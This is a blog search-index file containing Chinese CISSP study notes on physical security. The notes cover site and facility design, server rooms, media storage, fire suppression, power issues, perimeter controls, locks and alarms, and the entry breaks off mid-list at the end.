<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>cissp学习笔记（10）——物理安全需求</title>
      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8810%EF%BC%89%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8810%EF%BC%89%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>3) 安全工程(安全的工程学和管理)</p><ul><li>J. 应用安全原则到场所和设施设计中</li><li><p>K. 设计和应用物理安全</p><ul><li>K.1 配线柜</li><li>K.2 服务器机房</li><li>K.3 介质存储设施</li><li>K.4 证据存储</li><li>K.5 受限和工作区域安全(例如，运营中心)</li><li>K.6 数据中心安全</li><li>K.7 基础设施和HVAC注意事项</li><li>K.8 水的问题(例如，漏水和水灾)</li><li>K.9 火灾预防、检测和抑制<br>7) 安全运营(例如，基本概念、调查、实践管理、灾难恢复)</li></ul></li><li><p>O. 应用和管理物理安全</p><ul><li>O.1 周边(例如，访问控制和监控)</li><li>O.2 内部安全(例如，陪同要求/访问控制、钥匙和锁)</li></ul></li></ul><h3 id="10-1-应用安全原则到选址和设施设计"><a href="#10-1-应用安全原则到选址和设施设计" class="headerlink" title="10.1 应用安全原则到选址和设施设计"></a>10.1 应用安全原则到选址和设施设计</h3><h4 id="10-1-1-安全设施计划"><a href="#10-1-1-安全设施计划" class="headerlink" title="10.1.1 安全设施计划"></a>10.1.1 安全设施计划</h4><p>　　安全设施计划描述了组织的安全要求的轮廓，并且着重强调为了提供安全性所用的方法和机制。关键路径分析是一种系统工作，可以确定关键任务应用、过程和操作以及所有必要的支持要素之间的关系。当正确执行关键路径分析时，支撑组织的必要的相互依赖和相互作用就会形成。一旦分析完成，那么结果将作为一列安全条目提供服务。在检查关键路径时，己完成的评估或潜在的技术融合是很重要的。技术融合是不同的技术、解决方案、工具和系统在随着时间的推移进行发展和合井的趋势。安保人员应参与场所和设施的设计考虑。否则，对于现存的逻辑安全，在许多物理安全方面的内容可能会被忽略。</p><h4 id="10-1-2-场所选择"><a href="#10-1-2-场所选择" class="headerlink" title="10.1.2 场所选择"></a>10.1.2 场所选择</h4><p>　　场所的选择应该以组织的安全需要为基础。成本、地点和大小都很重要，但是解决安全要求始终应当放在首位。在整个场所选择过程中，场所的位置和构造起到了至关重要的作用。毗邻其他建筑物和业务是另一个至关重要的考虑因素。至少要确保建筑物的设计要求能够应对极端的天气，并且能够阻拦或防御明显的非法闯入企图。容易受到攻击的进入位置(例女日，窗户和门)往往就是此类分析。此外，还应当评估非法闯入容易借助的遮挡视线的物体(例如，树木、灌木或人为因素) 。</p><h4 id="10-1-3-可视性"><a href="#10-1-3-可视性" class="headerlink" title="10.1.3 可视性"></a>10.1.3 可视性</h4><p>　　可视性是十分重要的。必须对周围地形、周围区域的组成、紧急事件服务机构、潜在危险等进行分析。</p><h4 id="10-1-4-自然灾害"><a href="#10-1-4-自然灾害" class="headerlink" title="10.1.4 自然灾害"></a>10.1.4 自然灾害</h4><p>　　必须准备应付自然灾害，并且使町环境经受得住灾害事件的影响，或者可以容易地进行替换。</p><h4 id="10-1-5-设施的设计"><a href="#10-1-5-设施的设计" class="headerlink" title="10.1.5 设施的设计"></a>10.1.5 设施的设计</h4><p>　　在进行设施的设计时，需要理解组织所需的安全等级。在设计开始之前，必须计划并设计恰当的安全等级。”安全架构”经常被称为环境设计预防犯罪(Crime Prevention Through Environmental Design，CPTED)。指导思想是通过结构化的物理环境和周围环境，在潜在的罪犯做出任何犯罪行为之前影响其个人决定。</p><h3 id="10-2-设计和实施物理安全"><a href="#10-2-设计和实施物理安全" class="headerlink" title="10.2 设计和实施物理安全"></a>10.2 设计和实施物理安全</h3><p>　　用于对物理安全进行管理的安全控制可以分为三组： 行政性的、技术性的和物理性的。由于它们都用于描述访问控制的相同类别，因此记住这些分组的物理安全特性是十分重要的。为具体环境设计物理安全性时，需要牢记控制措施的功能顺序：</p><ul><li>阻拦</li><li>拒绝</li><li>检测</li><li>延缓</li></ul><h4 id="10-2-1-设备故障"><a href="#10-2-1-设备故障" class="headerlink" title="10.2.1 设备故障"></a>10.2.1 设备故障</h4><p>　　系统返回到完整的正常功能状态的响应时间与这种解决方案所涉及的维护成本成正比。成本包括存储、运输、预先购买以及维护现场安装和恢复专业技术。在某些情况中，维护现场替换是不可行的。对于这种情况，与硬件供应商签订服务级别协议(SLA)是十分必要的。SLA 清楚地定义了供应商在发生设备故障的紧急情况下所提供的响应时间。对老化的硬件进行替换和/或修理应该制定时间表。这些操作的时间表应该以为每种设备估计的平均无故障时间(Mean Time To Failure，MTTF)和平均修复时间(Mean Time To Repair，MTTR)为基础。设备送外修复时，需要在修复期间使用替代的解决方案或备份设备。通常，在出现小故障时进行修理是可以接受的，但是等到出现大故障时再进行更换，就是一种无法接受的安全实践。</p><h4 id="10-2-2-配线间"><a href="#10-2-2-配线间" class="headerlink" title="10.2.2 配线间"></a>10.2.2 配线间</h4><p>　　现代的配线间是整个建筑或一个楼层中连接到其他重要设备的网络电缆所在的地方，如配线架、交换机、路由器、局域网扩展和骨干渠道。配线间一个更专业的技术名称是房屋线缆分布室。为了保证最大线缆传输限制，大型建筑物里需要多个配线间。配线间的安全是非常重要的。大部分的安全重点是在防止未授权的物理访问方面。如果一个未授权的入侵者获准访问该地区，他们可能偷取设备、拖拉或切断电缆，甚至安放窃听设备。因此，配线间的安全策略应包括如下可靠规则：</p><ul><li>不把配线间作为通用的存储区。</li><li>足够多的锁。</li><li>持区域的整洁。</li><li>不要存放易燃易爆物品。</li><li>设置视频来监控内部的配线间活动。</li><li>使用开门传感器来记录日志。</li><li>不要把钥匙给除了授权管理人员之外的任何人。</li><li>对配线间的安全和内容进行定期的物理检查。</li><li>把配线间纳入组织的环境管理和监控，以确保有适当的环境控制和监控，以及检测破坏性条件，如洪水或火灾。</li></ul><h4 id="10-2-3-服务器机房"><a href="#10-2-3-服务器机房" class="headerlink" title="10.2.3 服务器机房"></a>10.2.3 服务器机房</h4><p>　　服务器机房、数据中心、通信机房、配线间、服务器保管室和π 机房是被封闭的、受限的和受保护的房间，这里放置着关键的服务器和网络设备。集中化的服务器机房不需要与人相协调。服务器机房应设在建筑物的核心位置。尽量避免放置在底层、顶层和地下室。此外，服务器机房应远离水、气和污水管道，这些管道泄漏或泛滥的风险太大，可能会造成严重的损坏和故障停机时间。</p><h4 id="10-2-4-介质存储设施"><a href="#10-2-4-介质存储设施" class="headerlink" title="10.2.4 介质存储设施"></a>10.2.4 介质存储设施</h4><ul><li>把介质存放在上锁的柜子或保险箱中。</li><li>有库管理员或保管员来管理对带锁的介质柜的访问。</li><li>使用存入/取出流程来跟踪谁在检索、使用和返回存储介质。</li><li>对于重用介质，当被返还时，运行安全磁盘擦除或归零(通过无意义的数据(比如零)来取代擦除数据的过程)过程来删除所有残留数据。</li></ul><h4 id="10-2-5-证据存储"><a href="#10-2-5-证据存储" class="headerlink" title="10.2.5 证据存储"></a>10.2.5 证据存储</h4><ul><li>安全证据存储可能涉及以下：</li><li>一个专用的存储系统以区别于生产网络</li><li>当没有新的数据集传输到存储系统时就将存储系统离钱</li><li>阻断存储系统和互联网的连接</li><li>跟踪证据存储系统的所有活动</li><li>计算存储在系统中所有数据的哈希值</li><li>限制安全管理员和法律顾问的访问</li><li>对所有存储在系统上的数据进行加密</li></ul><h4 id="10-2-6-受限的和工作区域安全-例如，运营中心"><a href="#10-2-6-受限的和工作区域安全-例如，运营中心" class="headerlink" title="10.2.6 受限的和工作区域安全(例如，运营中心)"></a>10.2.6 受限的和工作区域安全(例如，运营中心)</h4><p>　　工作区和参观区域的设计和配置都应该仔细考虑。对设施内所有地方的进入要求不应该等同对待。进入含有更高价值或重要资产的区域应该受到限制。有价值的和保密的资产应该放置在设施的核心保护区或中心地区。实际上，应该专注于部署物理保护的同心圆。这种配置类型要求较高的授权级别才能进入组织的更敏感区域。设施安全设计过程应该支持内部安全的实施和维护。除了在适当的工作场所管理员工外，还应该解决访客和访客控制问题。</p><h4 id="10-2-7-数据中心安全"><a href="#10-2-7-数据中心安全" class="headerlink" title="10.2.7 数据中心安全"></a>10.2.7 数据中心安全</h4><h5 id="1-智能卡"><a href="#1-智能卡" class="headerlink" title="1. 智能卡"></a>1. 智能卡</h5><p>　　智能卡是信用卡大小的身份证、员工证或安全通行证，卡上具有磁条、条形码或植入的集成电路芯片。智能卡包含了经过授权的可以被用于身份识别和/或身份认证目的的持卡人信息。某些智能卡甚至具有处理信息的能力或被用于在内存芯片上存储一定数量的数据。下列短语或术语指的都是智能卡：</p><ul><li>包含集成电路(IC)的身份令牌</li><li>处理器IC卡</li><li>具有ISO 7816接口的IC卡</li></ul><p>　　大多数情况下，智能卡被用于多因子配置，因此，智能卡被盗或丢失不容易发生冒名替代的后果。最常见的用于智能卡的多因子认证要求使用PIN。</p><h5 id="2-接近式读卡机"><a href="#2-接近式读卡机" class="headerlink" title="2. 接近式读卡机"></a>2. 接近式读卡机</h5><p>　　接近式读卡机可以是无源设备、场源设备或发送应答器。接近式设备由经过授权的持卡人携带或持有，当持卡人通过接近式读卡机时，接近式读卡机能够确定持卡人的身份及其是否己被授权进行访问。无源设备不具有活动电子，只是具有特定属性的小磁场(如DVD 上常见的防盗设备)。场源设备是一种电子设备，当进入由读卡机产生的电磁场时会被激活。发送应答器是自有电源的设备，并且发射由读卡机接收的信号。除了智能卡、无记忆卡和接近式读卡机以外，还可以使用无线射频识别(RFID)或生物测定学方面的访问控制设备来管理物理访问。</p><h5 id="3-入侵检测系统"><a href="#3-入侵检测系统" class="headerlink" title="3. 入侵检测系统"></a>3. 入侵检测系统</h5><p>　　入侵检测系统是自动化的或人工的系统，这种系统被设计用于检测未经授权的个人企图发起的入侵、破坏或攻击行为，未授权入口点的使用情况，以及在未经授权的时间或非正常时间发生的犯法事件。物理的入侵检测系统也被称为防盗警报器，用于检测未经授权的活动并通知管理机构(内部的安全部门或外部的执法部门)。</p><h5 id="4-访问滥用"><a href="#4-访问滥用" class="headerlink" title="4. 访问滥用"></a>4. 访问滥用</h5><p>　　物理访问控制的滥用示例包括敞开安全门、绕过锁或访问控制。伪装是指使用其他人的安全ID获得进入某座设施的权限。尾随是指跟随着某个人通过受到安全保护的门或通道，而自己并没有接受身份识别或身份认证。这样的检测滥用可以通过建立审计跟踪和保持访问日志来完成。</p><h5 id="5-放射防护"><a href="#5-放射防护" class="headerlink" title="5. 放射防护"></a>5. 放射防护</h5><p>　　用于阻止放射攻击的对策和防护类型被称为瞬时电磁脉冲设备屏蔽技术TEMPEST设备。TEMPEST的一些对策有法拉第笼、白噪声和控制区：</p><ul><li><strong>法拉第笼</strong> 通常是完全包围区域所有面的金属网。这个金属外壳具有能够产生电容效应(因此以法拉第命名)的弱电，从而可以防止所有电磁信号(放射信号)逸出或进入由法拉第笼围绕的区域。法拉第笼能够非常有效地阻拦EM信号。事实上，在有效的法拉第笼的内部，移动电话无法使用，并且无法接收广播或电视信号。</li><li><strong>白噪声</strong> 白噪声指的是一直广播虚假通信数据，从而掩盖和隐藏实际存在的放射信号。白噪声可以由另一个非机密来源的实际信号、特定频率的连续信号、随机的可变信号(例如，在广播电台或电视台之间听到的自噪声)甚至导致截获设备失效的干扰信号组成。在区域边界的周围生成白噪声是最为有效的，此时白噪声通过向外广播以保护需要放射信号才能完成正常运作的区域内部。</li><li><strong>控制区</strong> 控制区是第三种TEMPEST对策，它只是在受保护区域环境内实现法拉第笼或白噪声，在受保护区域环境外则不采取任何措施。控制区是所需设备使用和支持放射信号的区域(例如，无线互联、移动电话、无线电和电视信号)。在控制区外部，我们需要使用不同的TEMPEST对策来阻止对放射信号的拦截。</li></ul><h4 id="10-2-8-基础设施和HVAC注意事项"><a href="#10-2-8-基础设施和HVAC注意事项" class="headerlink" title="10.2.8 基础设施和HVAC注意事项"></a>10.2.8 基础设施和HVAC注意事项</h4><p>　　电力公司供应的电源并不总是连续的和平稳的。大多数电子设备需要平稳的电力供应才能正常工作。由于电源的波动而导致设备损坏的事情经常发生。不间断电源供应(Uninterruptible Power Supply，UPS)是一种自充电的电池类型，可以为敏感的设备提供连续和平稳的电力。另一种确保设备不会因为电源波动而造成损坏的方法是使用带有电涌保护器的配电盘。电涌保护器包含一根保险丝，它在电源功率剧烈变化而造成对设备的损坏之前熔断。但是一旦电涌保护器的保险丝熔断或电路因跳闸切断，电流就会被完全中断。如果希望维持很长时间的电力并且不会造成停电，那么需要一台现场发电机。大多数发电机运转时都使用液态或气态的燃料水槽，为了保证可靠性，必须维持充足的燃料。发电机被认为是电源的替换或后备方案。与电源相关的问题有很多。下面是应当熟悉的一组电源术语：</p><ul><li><strong>故障(fault)</strong> 电力瞬间消失</li><li><strong>中断(blackout)</strong> 电力完全消失</li><li><strong>电压不足(sag)</strong> 瞬间电压降低</li><li><strong>降压(brownout)</strong> 长时间低电压</li><li><strong>脉冲(spike)</strong> 瞬间高电压</li><li><strong>电涌(surge)</strong> 长时间高电压</li><li><strong>起动功率(inrush)</strong> 电源开始的电涌通常与连接的电源有关，无论电源是主电源还是替换/辅助电源</li><li><strong>噪声(noise)</strong> 持续不断的电源干扰</li><li><strong>瞬时现象(transient)</strong> 短时间的线路杂音干扰</li><li><strong>平稳(clean)</strong> 完全平稳的电流</li><li><strong>接地(ground)</strong> 电路中的电线是接地的</li></ul><h5 id="1-噪声"><a href="#1-噪声" class="headerlink" title="1. 噪声"></a>1. 噪声</h5><p>　　噪声造成的问题不仅会影响设备的功能，还可能会干扰通信、传输和播放的质量。电磁干扰(EMI)有两种类型： 普通模式和导线模式。普通模式的噪声是由电源或运转的电子设备的火线和地线之间的电势差产生的。导线模式的噪声是由电源或运转的电子设备的火线和中线之间的电势差产生的。与此类似的问题是射频干扰(RFI)，它与EMI一样，会影响许多系统。RFI由很多常见的电器产生。保护电力供应和保护设备不受到噪声干扰，这是为IT基础设施维护高效和功能稳定的环境的重要部分。这种保护措施所采取的步骤包括： 提供充足的电力条件，建立合适的接地措施，屏蔽所有电缆，以及限制暴露在EMI和RFI源中。</p><h5 id="2-温度、湿度和静电"><a href="#2-温度、湿度和静电" class="headerlink" title="2. 温度、湿度和静电"></a>2. 温度、湿度和静电</h5><p>　　除了考虑电源问题，维护环境还包括控制来暖、通风和空调(HVAC)的机制。湿度太高会导致侵蚀，湿度太低则会产生静电。即使在不产生静电的地毯上，如果环境中的湿度太低，那么仍然可能产生两万伏特的静电放电。</p><h4 id="10-2-9-水的问题-例如，漏水和水灾"><a href="#10-2-9-水的问题-例如，漏水和水灾" class="headerlink" title="10.2.9 水的问题(例如，漏水和水灾)"></a>10.2.9 水的问题(例如，漏水和水灾)</h4><p>　　只要有可能，就要将放置服务器的房间和重要计算机设备远离任何水源或传输管道。还可能希望在关键任务系统的地板周围安装水检测电路。水检测电路具有警报装置，如果水正在侵入设备，那么就会发出警报。</p><h4 id="10-2-10-火灾的预防、检测和抑制"><a href="#10-2-10-火灾的预防、检测和抑制" class="headerlink" title="10.2.10 火灾的预防、检测和抑制"></a>10.2.10 火灾的预防、检测和抑制</h4><p>　　不同的抑制介质针对火的不同方面：</p><ul><li>水能够抑制高温</li><li>苏打酸和其他干粉能够抑制燃料供应</li><li>二氧化碳能够抑制氧气供应</li><li>哈龙替代物与其他非易燃气体能够干扰化学燃烧和/或抑制氧气供应</li></ul><h5 id="1-灭火器"><a href="#1-灭火器" class="headerlink" title="1. 灭火器"></a>1. 灭火器</h5><table><thead><tr><th>级别</th><th>火灾类型</th><th>灭火材料</th></tr></thead><tbody><tr><td>A</td><td>普通的易燃品</td><td>水、苏打酸(干粉或液态化学物质)</td></tr><tr><td>B</td><td>液体</td><td>二氧化碳、哈龙*、苏打酸</td></tr><tr><td>C</td><td>电子</td><td>二氧化碳、哈龙*</td></tr><tr><td>D</td><td>金属</td><td>干粉</td></tr></tbody></table><ul><li>哈龙或EPA 批准的哈龙替代物</li></ul><h5 id="2-防火检测系统"><a href="#2-防火检测系统" class="headerlink" title="2. 防火检测系统"></a>2. 防火检测系统</h5><p>　　当达到某一特定温度时，设定好温度的检测系统就会触发灭火抑制装置。触发器通常是带洒水头的金属或塑料元件，在某一特定的温度下会融化。温度上升比率检测系统在温度的改变速度达到某一特定级别时就会触发灭火抑制装置。火焰激发系统是根据火焰的红外线能量来触发灭火抑制装置。烟感系统则根据光电或放射性电离传感器来触发灭火抑制装置。大多数防火检测系统可以与火灾响应服务通知机制链接在一起。在灭火抑制装置被触发时，这些链接在一起的系统会通过发出自动的消息或警报来通知本地的火灾响应团队以及请求援助。</p><h5 id="3-放水灭火系统"><a href="#3-放水灭火系统" class="headerlink" title="3. 放水灭火系统"></a>3. 放水灭火系统</h5><ul><li>湿管道系统(也称为封闭头系统)总是充满了水。当灭火装置被触发时，就会立刻放水。</li><li>干管道系统中包含被压缩的空气。一旦灭火装置被触发，空气泄漏，打开水间，从而使管道充满水井放出水来。</li><li>洪水系统是干管道系统的另一种形式，它使用较粗的管道，因此能排出大股的水流。洪水系统对于放置了电子设备和计算机的环境不太适合。</li><li>预先响应系统是干管道/湿管道系统的组合系统。这种系统一直作为干管道系统存在，直至检测到有火灾(烟、热及其他)发生，然后向管道中充满水。由于充分受热，洒水头触发器被融化之后释放出水。如果在洒水头被触发之前火被熄灭，那么管道可以被手工排空并重新设置。这种系统还允许在洒水头触发之前进行人工干预，以便停止放水。</li></ul><h5 id="4-气体释放系统"><a href="#4-气体释放系统" class="headerlink" title="4. 气体释放系统"></a>4. 气体释放系统</h5><p>　　气体释放系统通常比放水系统更有效。然而，气体释放系统不应当被部署在有人的环境中。气体释放系统通常从空气中抽走氧气，因此对人是非常危险的。</p><h5 id="5-损失"><a href="#5-损失" class="headerlink" title="5. 损失"></a>5. 损失</h5><p>　　火灾引起的破坏性要素包括烟和热，还包括灭火抑制介质(如水或苏打酸)。烟对大多数存储设备都会造成损坏。热会损坏所有的电子或计算机组件。灭火抑制介质可能会引起电路短路、加快侵蚀或导致设备无法使用。在设计火灾响应系统时，必须考虑上述所有问题。</p><h3 id="10-3-实施和管理物理安全"><a href="#10-3-实施和管理物理安全" class="headerlink" title="10.3 实施和管理物理安全"></a>10.3 实施和管理物理安全</h3><h4 id="10-3-1-周边-例如，访问控制和监控"><a href="#10-3-1-周边-例如，访问控制和监控" class="headerlink" title="10.3.1 周边(例如，访问控制和监控)"></a>10.3.1 周边(例如，访问控制和监控)</h4><p>　　建筑物或校园位置的入口也很重要。单入口可极大地提供安全性，但多个入口在紧急情况下可提供更好的疏散性。</p><h5 id="1-栅栏、大门、旋转门和陷阱"><a href="#1-栅栏、大门、旋转门和陷阱" class="headerlink" title="1. 栅栏、大门、旋转门和陷阱"></a>1. 栅栏、大门、旋转门和陷阱</h5><p>　　栅栏是外围设备。栅栏被用于在受到特殊安全保护级别的区域和其他区域之间进行明确的隔离。用栅栏筑围墙可以包括广泛的成分、材料和建造方法，可能包括地上的画线、铁丝网、带刺铁丝网、水泥墙和使用激光、运动探测仪或热源探测仪的不可见防线。大门是栅栏上受到控制的出入点。为了维持栅栏整体的有效性，大门的阻挡程度必须与栅栏的阻挡程度相同。绞链和锁闭/闭合机制应该进行加固，以防止损坏、破坏或拆卸。当大门关闭时，不应该提供任何额外的出入脆弱性。门的数量应当尽可能最少。旋转门每次只可以进一个人，并且常常限制为单方向转动。要么只允许进门，要么只允许出门。旋转门基本上可以等同于安全的旋转门。陷阱是通常由保安人员守护的双重门设置。陷阱的目的是牵制主体，直至其身份得到确认和验正。如果经过证明他们可以被授权进入，那么内部的门打开，从而准许这些人员进入设施或周围的附属地区。如果他们没有得到授权，那么两扇门都保持关闭并锁住，直至警卫(通常是保安人员或警察)到来将这些闯入者护送离开设施或因非法入侵逮捕他们(这也被称为迟滞特性) 。通常，陷阱包括阻止跟随捎带和尾随的措施。</p><h5 id="2-照明"><a href="#2-照明" class="headerlink" title="2. 照明"></a>2. 照明</h5><p>　　照明是最常用的一种边界安全控制形式。照明的主要目的是阻拦那些偶然的入侵者、闯入者、小偷和希望在黑暗中实施恶意行为的潜在窃贼。照明应当不照亮保安人员、看门狗、巡逻岗哨或其他类似的安全保卫者。此外，在攻击者非法闯入期间，照明也不能因为强光或反射使保安人员、看门狗和监控设备受到干扰，否则更利于攻击者。</p><h5 id="3-保安和看门狗"><a href="#3-保安和看门狗" class="headerlink" title="3. 保安和看门狗"></a>3. 保安和看门狗</h5><p>　　所有的物理安全控制，无论是静止的阻碍物还是主动的检测和监视机制，最终都要依靠人的介入来阻止实际的入侵和攻击。保安可能沿边界进行部署，或者被部署在边界内。他们监视着进出口，或者监控着进行检测和监视的显示器。保安的真正优势在于他们能够适应任何环境或情况并做出反应。保安能够记住并识别攻击和入侵的行为和方式，可以适应正在改变的环境，并且能够作出判断和决定。在需要立即的、现场的事态控制和决策制定时，保安常常是恰当的安全控制选择。不是所有的环境和设施都支持部署保安。这可能是由于实际环境中存在不适合人的因素，或是设施的规划、设计、位置和建筑的原因。不是所有的保安都是可信赖的。预先筛选、联系和培训无法保证不会出现低效的和不可靠的保安。看门狗可以替代保安，它们常常作为边界的安全控制措施进行部署。作为侦测和威慑的一种形式，看门狗是非常有效的。然而，喂养狗的费用很高，并且需要高标准的养护，同时还会带来极高的保险和责任要求。</p><h4 id="10-3-2-内部安全-例如，陪同要求-访问者控制、钥匙和锁"><a href="#10-3-2-内部安全-例如，陪同要求-访问者控制、钥匙和锁" class="headerlink" title="10.3.2 内部安全(例如，陪同要求/访问者控制、钥匙和锁)"></a>10.3.2 内部安全(例如，陪同要求/访问者控制、钥匙和锁)</h4><h5 id="1-钥匙和密码锁"><a href="#1-钥匙和密码锁" class="headerlink" title="1. 钥匙和密码锁"></a>1. 钥匙和密码锁</h5><p>　　锁使得被关闭的门保持闭合。它们被用于阻止缺乏正确授权的人。锁是身份标识和身份认证机制的强硬形式。只有具有正确的钥匙或密码，才会被授权准许进入。使用钥匙的锁是最常见的和最廉价的物理访问控制设备形式，常常被称作预置锁。可编程的锁或密码锁能够提供比预置锁更广泛的控制。电子访问控制(EAC)锁由下列三种元素组成： 保持门关闭的电磁体、验证主体和使电磁体失效的凭证读卡机，以及重新使用电磁体的闭门感应器。</p><h5 id="2-员工证"><a href="#2-员工证" class="headerlink" title="2. 员工证"></a>2. 员工证</h5><p>　　员工证、身份证或安全ID都是物理身份标识和/或电子访问控制设备的形式。员工证可能被用在物理访问主要受到保安控制的环境中。员工证还可以在由扫描设备守卫而非保安守卫的环境中使用。</p><h5 id="3-运动探测仪"><a href="#3-运动探测仪" class="headerlink" title="3. 运动探测仪"></a>3. 运动探测仪</h5><p>　　运动探测仪或运动传感器是在特殊区域内使用的、用于感知物体运动的设备。运动探测仪的常见类型如下：</p><ul><li><strong>红外运动探测仪</strong> 对被监控区域红外照明模式的显著变化进行监视。</li><li><strong>热能型运动探测仪</strong> 对被监控区域内的热能等级和模式的显著变化进行监视。</li><li><strong>波形运动探测仪</strong> 向被监控的区域发射连续的弱超声波或高频微波，并且对反射波的显著扰动或变化进行监视。</li><li><strong>电容运动探测仪</strong> 对被监控物体周围区域的电场或磁场变化进行探测。</li><li><strong>光电运动探测仪</strong> 通常在没有窗户或保持昏暗的房间内部使用。</li><li><strong>无源音频运动探测仪</strong> 对被监控区域内的非正常声音进行侦听。</li></ul><h5 id="4-入侵警报"><a href="#4-入侵警报" class="headerlink" title="4. 入侵警报"></a>4. 入侵警报</h5><p>　　警报是一种分离机制，可以引发威慑、防护和/或通知。</p><ul><li><strong>威慑报警</strong> 引发威慑警报可能会采用额外的加锁、关门等措施。这种警报的目的是使得进一步的入侵或攻击变得更难。</li><li><strong>排斥报警</strong> 引发排斥警报声通常听起来像汽笛或钟声，并且会将灯打开。这些警报类型被用于令入侵者或攻击者气馁，从而不再继续他们的恶意或入侵行为，并且离开这个设施。</li><li><strong>通知报警</strong> 引发通知警报对于入侵者汇攻击者来说常常是缄默的，但是它们会记录事故的相关数据，并且通知管理员、保安和执法机构。事故的记录可以采取日志文件和/或闭路电视磁带的形式。缄默警报的目的是将授权的安全人员带到入侵或攻击的位置，以便期望抓住进行有害活动的人。</li></ul><p>　　报警也通过它们所在的地方(本地、集中、专有或辅助)被归类。</p><ul><li><strong>本地报警</strong> 本地警报系统必须广播司听到的警报信号(最大可到120分贝)，这个信号最远可以传播400英尺。此外，本地警报系统必须受到保护，通常应由保安进行保护，以防止损害和损坏。为了使警报系统有效，附近必须有安全团队或保安，他们可以在警报被触发后立即进行响应。</li><li><strong>集中式警报系统</strong> 可能在本地没有警报，在警报触发时会通过信号通知远程或集中式监控站。大多数中央集中式系统都是很知名的公司或是国家安全公司。专有系统类似于中央系统，但托管组织有他们自己的现场保安人员等待并响应安全破坏。</li><li><strong>辅助警报系统</strong> 辅助警报系统可以加入本地或集中式警报系统。当安全边界被破坏时，紧急服务机构将被通知和对事件做出响应，并抵达相应地点。这些紧急服务机构可能包括消防、警察和医疗服务。</li></ul><h5 id="5-二次验证机制"><a href="#5-二次验证机制" class="headerlink" title="5. 二次验证机制"></a>5. 二次验证机制</h5><p>　　当运动检测器、传感器和报警器被使用时，二次验证机制应该在适当的位置。随着这些设备的灵敏度增高，错误触发会经常发生。使用两个或两个以上的检测和传感器系统，并要求警报发出之前的短时内有两个或两个以上的快速成功触发。这可以显著减少错误警报，并提高报警显示实际入侵或攻击的可能性。CCTV是一种安全机制，涉及运动探测器、传感器和报警器。然而，CCTV并不是自动化的检测和响应系统。CCTV需要人员观看捕获的批频来检测可疑和恶意的活动，并触发报警。安全摄像头可以扩大保安人员的有效可见范围，因此增大了监控的范围。用来作为一个二次或后续机制，当自动化系统触发后进行审查。事实上，审计和审计跟踪的使用逻辑同样用于CCTV 和事件记录。CCTV 是预防措施，而审查事件记录是检测措施。</p><h5 id="6-环境和生命安全"><a href="#6-环境和生命安全" class="headerlink" title="6. 环境和生命安全"></a>6. 环境和生命安全</h5><p>　　不论在任何情况和任何条件下，保护人员生命是安全的最重要方面。因此，对于所有安全解决方案来说，防止人员遭受生命伤害是最重要的目标。对人员生命安全进行维护的部分内容是维护设施的基本环境。物理安全措施应注重保障人员生命，然后才是恢复环境的安全性和恢复IT基础设施的必要功能。<br>　　许多组织采取人员紧急计划(0∞upant Emergency Plan，OEP)指导和协助在灾难发生时维持人员生命安全。OEP提供了如何减少对生命的威胁、防止损伤、管理压力、处理迁移以及提供安全监控保护财产的指导，并保护资产避免在物理事件中遭受损害。OEP不解决IT问题或业务连续性问题，而只解决人员和一般财产问题。BCP和DRP才解决IT、业务连续性和恢复问题。</p><h5 id="7-隐私责任和法律需求"><a href="#7-隐私责任和法律需求" class="headerlink" title="7. 隐私责任和法律需求"></a>7. 隐私责任和法律需求</h5><p>　　隐私意味着保护个人信息不被泄露给未经任何授权的个人或实体。处理隐私是任何有员工的组织的一个要求。因此，隐私是所有组织的一个核心问题。对于任何组织，隐私保护应该在安全策略中是一个核心任务或目标设定。</p><h5 id="8-合规要求"><a href="#8-合规要求" class="headerlink" title="8. 合规要求"></a>8. 合规要求</h5><p>　　每个组织都运营在一定的行业和管辖权内。这两个实体(可能还有附属的实体)把法律要求、限制和规定强加到它们领域内的组织实践中。这些法律要求可以应用于软件许可、雇佣限制、处理敏感资料，并符合安全规定。遵守所有适用的法律规定是维护安全的一个关键部分。法律法规要求对于行业或国家(也经常是州和城市)都一定在基础安全建设方面被视为底线和基础。</p><h3 id="10-4-考试要点"><a href="#10-4-考试要点" class="headerlink" title="10.4 考试要点"></a>10.4 考试要点</h3><ul><li><strong>理解为什么缺乏物理安全就没有安全性</strong> 缺乏对物理环境的控制，那么行政性的或技术性的/逻辑性的访问控制就无法提供足够的安全性。如果’怀有恶意的人可以获得对设施或设备的物理访问权限，那么他们就会进行他们想要做的任何事情，包括从破坏到泄密乃至更改的任何事情。</li><li><strong>能够列举行政性的物理安全控制</strong> 行政性的物理安全控制包括场地的构造和选择、场地管理、人员控制、意识培训和紧急事件响应及规程。</li><li><strong>能够列举技术性的物理安全控制</strong> 技术性的物理安全控制包括访问控制、入侵检测、警报、CCTV、监视、HVAC、电源以及火灾检查和排除。</li><li><strong>能够指出物理安全的物理控制</strong> 物理安全的物理控制包括栅栏、照明、锁、建筑材料、陷阱、看门狗和警卫。</li><li><strong>理解控制的作用顺序</strong> 控制的作用顺序依次是： 阻拦、拒绝、检测和延缓。</li><li><strong>理解选择场地和设计建筑设施的主要内容</strong> 确定场地方面的主要内容包括可视性、周围地形、地区的可到达性以及自然灾害的影响。设计建筑设施方面的主要内容是要理解组织需要的安全等级，在建筑设计开始之前制定计划。</li><li><strong>理解如何设计和配置安全工作区域</strong> 对设施内所有地方的进入要求不应该等同对待。包含更高价值或重要资产的地区的进出应该受到限制。有价值的和机密的资产应该放在设施提供的保护核心或中心地区。同样，集中放置的服务器或计算机机房不需要人员协调。</li><li><strong>理解配线间的安全问题</strong> 现代的配线间是整个建筑或一个楼层中连接到其他重要设备的网络电缆所在的地方，如配线架、交换机、路由器、局域网扩展、骨干渠道。配线间大部分的安全集中在防止未授权的物理访问。如果未授权入侵者进入该区域，他们可能会偷盗设备、拖拉或切断电缆甚至安放窃听设备。</li><li><strong>理解在安全设施内如何管理来访者</strong> 